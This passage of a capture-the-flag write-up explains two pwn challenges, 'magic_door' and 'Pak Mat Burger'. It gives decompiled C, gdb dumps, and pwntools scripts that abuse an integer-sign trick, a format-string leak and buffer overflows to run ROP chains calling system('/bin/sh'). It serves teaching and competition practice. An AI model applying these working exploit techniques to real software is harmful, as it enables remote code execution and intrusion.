+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">no_door_foryou</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">magic_door</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  undefined8 local_48;
+</span></span><span style="display:flex;"><span>  undefined8 local_40;
+</span></span><span style="display:flex;"><span>  undefined8 local_38;
+</span></span><span style="display:flex;"><span>  undefined8 local_30;
+</span></span><span style="display:flex;"><span>  undefined8 local_28;
+</span></span><span style="display:flex;"><span>  undefined8 local_20;
+</span></span><span style="display:flex;"><span>  undefined8 local_18;
+</span></span><span style="display:flex;"><span>  undefined8 local_10;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  local_48 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_40 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_38 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_28 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_20 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_18 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Congratulations! You opened the magic door!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Where would you like to go? &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_48,<span style="color:#ae81ff">0x100</span>,stdin);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</details></p>
+
+<p>There is an obvious buffer overflow in the magic_door function, and since stack canary is disabled, a simple ret2libc will allow us to get a shell pretty quickly.</p>
+<p>The tricky part is actually getting to the magic_door function call.<br>
+The program first asks which door you would like to open, and exits if you enter 50015. However, the program later checks to see if the door you want to open is 50015, and exits if its not.</p>
+<p>So in other words, you can&rsquo;t enter 50015, but you HAVE to enter 50015.<br>
+So how can you get past that? <strong>Negative numbers!</strong></p>
+<p>In memory, negative integers are stored in two&rsquo;s complement form.<br>
+So -1 would be stored as <code>0xffffffff</code>, -2 would be stored as <code>0xfffffffe</code>, and so on.<br>
+So essentially,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>-a in memory:
+</span></span><span style="display:flex;"><span>0x100000000 - a
+</span></span></code></pre></div><p>So if we want 50015 to be in local_c, one way is we can enter 50015, and the other is by entering <code>-(0x100000000-50015)</code>, which is <code>-4294917281</code>. This is so that the two&rsquo;s complement of 4294917281, which is <code>0x100000000-4294917281=50015</code>, will be stored in memory!</p>
+<p>This way, we can pass both checks and get into the magic_door function.</p>
+<blockquote>
+<p>To learn more about negative numbers in memory, you can look at <a href="https://www.youtube.com/watch?v=mT1V7IL2FHY&amp;t=6m16s">this liveoverflow video</a> or read <a href="https://en.wikipedia.org/wiki/Two%27s_complement">this wikipedia page</a></p>
+</blockquote>
+<p>After getting into the magic_door function, I just made a rop that leaks <code>puts@got</code> to leak libc, and then restart the program. Then I just used a ret2libc to get a shell.</p>
+<p>The libc version that the server uses isn&rsquo;t given in the handout, so in order to find it (so that I can accurately calculate function offsets correctly in my exploit), I leaked the <code>puts@libc</code> and <code>printf@libc</code> addresses on remote using <code>puts@got</code> and <code>printf@got</code>, and then used a <a href="https://libc.rip/">libc database search</a> to find the correct libc version</p>
+
+
+<p><details >
+  <summary markdown="span"><strong>exploit.py</strong></summary>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#io = process(&#34;./magic_door&#34;,aslr=False)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;13.229.222.125&#34;</span>,<span style="color:#ae81ff">32837</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gadgets</span>
+</span></span><span style="display:flex;"><span>entry <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401190</span>)
+</span></span><span style="display:flex;"><span>popRdi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401434</span>)
+</span></span><span style="display:flex;"><span>putsPlt <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4010e0</span>)
+</span></span><span style="display:flex;"><span>putsGot <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x404018</span>)
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401388</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Which door would you like to open?&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-4294917281&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak libc and restart binary </span>
+</span></span><span style="display:flex;"><span>rop  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x48</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> popRdi <span style="color:#f92672">+</span> putsGot <span style="color:#f92672">+</span> putsPlt <span style="color:#f92672">+</span> entry
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Where would you like to go?&#34;</span>,rop)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;puts&#34;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC BASE: &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Which door would you like to open?&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-4294917281&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># I have to add a ret gadget to my rop to make the stack 64 bit aligned to prevent the movaps issue</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># more on that here: https://ropemporium.com/guide.html </span>
+</span></span><span style="display:flex;"><span>rop  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x48</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> ret <span style="color:#f92672">+</span> popRdi <span style="color:#f92672">+</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Where would you like to go?&#34;</span>,rop)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+</details></p>
+
+<h2 id="pak-mat-burger-pwn">Pak Mat Burger (pwn)<a hidden class="anchor" aria-hidden="true" href="#pak-mat-burger-pwn">#</a></h2>
+<p><img loading="lazy" src="/wgmy23/blood2.png" alt="pakmat_burger first blood 🩸"  />
+</p>
+<p><strong>checksec:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>[*] &#39;/home/vagrant/ctf/wgmy23/pakmat_burger/pakmat_burger&#39;
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span></code></pre></div>
+
+<p><details >
+  <summary markdown="span"><strong>src.c</strong></summary>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>secret;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_3e [<span style="color:#ae81ff">9</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_35 [<span style="color:#ae81ff">10</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> name [<span style="color:#ae81ff">12</span>];
+</span></span><span style="display:flex;"><span>  undefined local_1f [<span style="color:#ae81ff">15</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">initialize</span>();
+</span></span><span style="display:flex;"><span>  secret <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;SECRET_MESSAGE&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (secret <span style="color:#f92672">==</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Error: SECRET_MESSAGE environment variable not set. Exiting...&#34;</span>);
+</span></span><span style="display:flex;"><span>    secret <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Welcome to Pak Mat Burger!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please enter your name: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%11s&#34;</span>,name);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hi &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(name);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;, to order a burger, enter the secret message: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%8s&#34;</span>,local_3e);
+</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(local_3e,secret);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Great! What type of burger would you like to order? &#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%14s&#34;</span>,local_1f);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please provide your phone number, we will delivered soon: &#34;</span>);
+</span></span><span style="display:flex;"><span>      secret <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgets</span>(local_35,<span style="color:#ae81ff">100</span>,stdin);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Sorry, the secret message is incorrect. Exiting...&#34;</span>);
+</span></span><span style="display:flex;"><span>      secret <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> secret;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</details></p>
+
+<p>There are two obvious vulnerabilities here, a format string vuln, and a buffer overflow vuln. Let&rsquo;s look at the rest of the program first to see what we&rsquo;re dealing with.</p>
+<p>The program first gets the secret from an environment variable SECRET_MESSAGE</p>
+<blockquote>
+<p>when testing locally, use <code>export SECRET_MESSAGE=&quot;...&quot;</code> to set the SECRET_MESSAGE environment variable</p>
+</blockquote>
+<p>Later on, the program asks for your name, and directly calls printf on it (this is where the format string vuln is).
+It then asks for the secret, and if you correctly input the secret, you get to write what type of burger you want, and your phone number (this is where the buffer overflow vuln is).</p>
+<p>Since we can control the first argument of a <code>printf(.,.,.)</code> call, it means that we can use <code>&quot;%1$p&quot;</code> to print the second arg, and <code>&quot;%2$p&quot;</code> to print the third arg, and so on and so forth</p>
+<p>So let&rsquo;s see what we can leak using the format string vuln by breaking at the printf call and looking at the arguments.</p>
+<blockquote>
+<p>I set the SECRET_MESSAGE env variable to &ldquo;1337&rdquo; locally</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Breakpoint 1, 0x000055555555542a in main ()
+</span></span><span style="display:flex;"><span>[ Legend: Modified register | Code | Heap | Stack | String ]
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+</span></span><span style="display:flex;"><span>$rax   : 0x0
+</span></span><span style="display:flex;"><span>$rbx   : 0x0
+</span></span><span style="display:flex;"><span>$rcx   : 0x00007ffff7ea7a77  →  0x5177fffff0003d48 (&#34;H=&#34;?)
+</span></span><span style="display:flex;"><span>$rdx   : 0x0
+</span></span><span style="display:flex;"><span>$rsp   : 0x00007fffffffe290  →  0x00007fffffffee15  →  0x4744580037333331 (&#34;1337&#34;?)
+</span></span><span style="display:flex;"><span>$rbp   : 0x00007fffffffe2d0  →  0x0000000000000001
+</span></span><span style="display:flex;"><span>$rsi   : 0x00007fffffffc170  →  &#34;Hi ase enter your name: &#34;
+</span></span><span style="display:flex;"><span>$rdi   : 0x00007fffffffe2ad  →  0x0000000000007025 (&#34;%p&#34;?)
+</span></span><span style="display:flex;"><span>$rip   : 0x000055555555542a  →  &lt;main+182&gt; call 0x555555555150 &lt;printf@plt&gt;
+</span></span><span style="display:flex;"><span>$r8    : 0x3
+</span></span><span style="display:flex;"><span>$r9    : 0x0
+</span></span><span style="display:flex;"><span>$r10   : 0x00005555555560a8  →  0x0000000000206948 (&#34;Hi &#34;?)
+</span></span><span style="display:flex;"><span>$r11   : 0x246
+</span></span><span style="display:flex;"><span>$r12   : 0x00007fffffffe3e8  →  0x00007fffffffe650  →  &#34;/home/vagrant/ctf/wgmy23/pakmat_burger/pakmat_burg[...]&#34;
+</span></span><span style="display:flex;"><span>$r13   : 0x0000555555555374  →  &lt;main+0&gt; endbr64
+</span></span><span style="display:flex;"><span>$r14   : 0x0000555555557d50  →  0x0000555555555280  →  &lt;__do_global_dtors_aux+0&gt; endbr64
+</span></span><span style="display:flex;"><span>$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
+</span></span><span style="display:flex;"><span>$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+</span></span><span style="display:flex;"><span>$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+</span></span><span style="display:flex;"><span>0x00007fffffffe290│+0x0000: 0x00007fffffffee15  →  0x4744580037333331 (&#34;1337&#34;?)  ← $rsp
+</span></span><span style="display:flex;"><span>0x00007fffffffe298│+0x0008: 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2a0│+0x0010: 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2a8│+0x0018: 0x0070250000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2b0│+0x0020: 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2b8│+0x0028: 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2c0│+0x0030: 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2c8│+0x0038: 0x4b9505916e213c00
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+</span></span><span style="display:flex;"><span>   0x55555555541e &lt;main+170&gt;       lea    rax, [rbp-0x23]
+</span></span><span style="display:flex;"><span>   0x555555555422 &lt;main+174&gt;       mov    rdi, rax
+</span></span><span style="display:flex;"><span>   0x555555555425 &lt;main+177&gt;       mov    eax, 0x0
+</span></span><span style="display:flex;"><span> → 0x55555555542a &lt;main+182&gt;       call   0x555555555150 &lt;printf@plt&gt;
+</span></span><span style="display:flex;"><span>   ↳  0x555555555150 &lt;printf@plt+0&gt;   endbr64
+</span></span><span style="display:flex;"><span>      0x555555555154 &lt;printf@plt+4&gt;   bnd    jmp QWORD PTR [rip+0x2e25]        # 0x555555557f80 &lt;printf@got.plt&gt;
+</span></span><span style="display:flex;"><span>      0x55555555515b &lt;printf@plt+11&gt;  nop    DWORD PTR [rax+rax*1+0x0]
+</span></span><span style="display:flex;"><span>      0x555555555160 &lt;alarm@plt+0&gt;    endbr64
+</span></span><span style="display:flex;"><span>      0x555555555164 &lt;alarm@plt+4&gt;    bnd    jmp QWORD PTR [rip+0x2e1d]        # 0x555555557f88 &lt;alarm@got.plt&gt;
+</span></span><span style="display:flex;"><span>      0x55555555516b &lt;alarm@plt+11&gt;   nop    DWORD PTR [rax+rax*1+0x0]
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
+</span></span><span style="display:flex;"><span>printf@plt (
+</span></span><span style="display:flex;"><span>   $rdi = 0x00007fffffffe2ad → 0x0000000000007025 (&#34;%p&#34;?),
+</span></span><span style="display:flex;"><span>   $rsi = 0x00007fffffffc170 → &#34;Hi ase enter your name: &#34;,
+</span></span><span style="display:flex;"><span>   $rdx = 0x0000000000000000
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p>So since this is an x86_64 binary, we are following the x86_64 calling convention.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>1st arg: stored in rdi
+</span></span><span style="display:flex;"><span>2nd arg: stored in rsi
+</span></span><span style="display:flex;"><span>3rd arg: stored in rdx
+</span></span><span style="display:flex;"><span>4th arg: stored in rcx
+</span></span><span style="display:flex;"><span>5th arg: stored in r8
+</span></span><span style="display:flex;"><span>6th arg: stored in r9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>7th,8th,9th,... arg: stored at the top of the stack
+</span></span></code></pre></div><blockquote>
+<p>to learn more abt this and also see how C programs work in assembly, watch <a href="https://www.youtube.com/watch?v=vXWHmucgZW0">this liveoverflow video</a></p>
+</blockquote>
+<p>So looking at the gdb output, we can see that the secret is stored at the top of the stack, which can be accessed by accesing the 7th argument of the printf call. Since <code>&quot;%1$p&quot;</code> refers to the second argument, we can use <code>&quot;%6$s&quot;</code> to leak the secret.</p>
+<p>After connecting to the server and leaking the secret multiple times, it can be seen that the secret stays the same through all connections. So you just have to leak it once, and you won&rsquo;t have to leak it again in your following exploits.</p>
+<blockquote>
+<p>the secret is <code>e31c8306</code> btw</p>
+</blockquote>
+<p>So cool! Now we can leak the secret. Well, what else can we leak? Let&rsquo;s continue examining the stack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>gef➤  tele 0x00007fffffffe290
+</span></span><span style="display:flex;"><span>0x00007fffffffe290│+0x0000: 0x00007fffffffee15  →  0x4744580037333331 (&#34;1337&#34;?)  ← $rsp
+</span></span><span style="display:flex;"><span>0x00007fffffffe298│+0x0008: 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2a0│+0x0010: 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2a8│+0x0018: 0x0070250000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2b0│+0x0020: 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2b8│+0x0028: 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2c0│+0x0030: 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2c8│+0x0038: 0x4b9505916e213c00
+</span></span><span style="display:flex;"><span>0x00007fffffffe2d0│+0x0040: 0x0000000000000001   ← $rbp
+</span></span><span style="display:flex;"><span>0x00007fffffffe2d8│+0x0048: 0x00007ffff7dbcd90  →   mov edi, eax
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gef➤  canary
+</span></span><span style="display:flex;"><span>[+] The canary of process 22462 is at 0x7ffff7d90768, value is 0x4b9505916e213c00
+</span></span></code></pre></div><p>It seems like we can leak both the canary, and the libc using the format string vuln.<br>
+Doing some simple counting, we find out that <code>%13$p</code> can be used to leak the canary, and <code>%15$p</code> can be used to leak a libc address, which we can use to calculate the libc base, and later on calculate the address of <code>system@libc</code> and the <code>&quot;/bin/sh&quot;</code> string in libc.</p>
+<blockquote>
+<p>I assumed that the libc used would be the same as the previous challenge, and it was indeed the same.</p>
+</blockquote>
+<p>Since we know the canary, we can easily bypass the canary check.<br>
+And since we know the libc base address, we can just do a ret2libc with the buffer overflow.</p>
+
+
+<p><details >
+  <summary markdown="span"><strong>exploit.py</strong></summary>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#io = process(&#34;pakmat_burger&#34;,aslr=False)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;13.229.222.125&#34;</span>,<span style="color:#ae81ff">32874</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#secret = b&#34;1337&#34;</span>
+</span></span><span style="display:flex;"><span>secret <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;e31c8306&#34;</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Please enter your name:&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%15$p%13$p&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hi &#34;</span>)
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">14</span>)<span style="color:#f92672">.</span>decode(),<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">128</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">171280</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC BASE: &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">18</span>)<span style="color:#f92672">.</span>decode(),<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;CANARY: &#34;</span> <span style="color:#f92672">+</span> hex(canary))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(io,gdbscript=&#34;break *0x5555555554fe&#34;)</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;enter the secret message:&#34;</span>,secret)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;order?&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;abcd&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gadgets found in libc</span>
+</span></span><span style="display:flex;"><span>popRdi <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2a3e5</span>)
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2a3e6</span>)
+</span></span><span style="display:flex;"><span>
